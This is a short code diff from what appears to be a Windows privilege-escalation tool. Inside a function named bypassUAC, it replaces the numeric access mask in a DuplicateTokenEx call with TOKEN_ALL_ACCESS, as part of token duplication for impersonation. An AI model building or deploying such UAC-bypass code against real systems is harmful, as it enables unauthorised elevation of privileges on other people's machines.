@@ -474,7 +474,7 @@ void bypassUAC() {
 	printf("[+]OpenProcessToken() success!\n");
 	//Now lets duplicate the token
 	HANDLE hTokenDuplicate;
-	if (!DuplicateTokenEx(hToken, 0xf01ff, NULL, SecurityImpersonation, TokenImpersonation, &hTokenDuplicate)) {
+	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hTokenDuplicate)) {
 		printf("hTokenDuplicate() error : % u\n", GetLastError());
 		ExitProcess(-1);
 	}
